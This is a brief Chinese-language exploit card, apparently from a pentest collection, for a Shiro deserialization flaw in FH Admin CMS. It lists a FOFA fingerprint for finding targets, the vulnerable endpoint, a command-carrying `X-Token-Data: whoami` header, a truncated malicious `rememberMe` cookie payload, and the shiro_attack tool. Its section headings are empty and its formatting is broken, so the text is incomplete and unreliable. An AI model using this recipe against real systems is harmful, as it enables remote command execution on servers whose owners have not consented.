# FHAdminCMS存在Shiro反序列化漏洞

- **系统**：FHAdminCMS　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`fofa`FH Admin CMS` * 特征`
- **请求**：`GET /appSysUser/registerSysUser.do HTTP/1.1`
- **关键头**：`X-Token-Data: whoami`　`Cookie: rememberMe=RjI4NWNFQzBDZTVGNWNBM6ByNoG5jvpzbQqTkz2zP8GLkE05HSQI3cfp4VAgaPDcrRrjk…`

**请求体 / payload**
```

工具复现\

\[shiro\_attack-4.5.4-SNAPSHOT-all.zip]\(公众号：渗透安全HackTwo
```

**其他**
- FH Admin CMS存在Shiro反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * FH Admin CMS